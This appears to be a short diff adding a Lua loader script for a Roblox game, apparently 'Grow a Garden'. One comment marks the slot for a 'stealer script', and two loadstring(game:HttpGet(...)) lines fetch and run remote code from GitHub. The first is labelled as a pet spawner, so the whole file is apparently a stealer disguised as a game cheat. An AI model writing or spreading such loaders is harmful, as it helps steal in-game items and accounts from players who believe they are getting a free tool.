@@ -1,0 +1,5 @@
+-- PUT YOU R STELER SCRIPT HERE
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenXHubV2/SpawnerGAG/refs/heads/main/PetSpawner-fdc8db1f.lua"))()
+
+-- GUI SCRIPT 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JadeSCRIPTZ/GAG/refs/heads/main/JadeHUB"))()
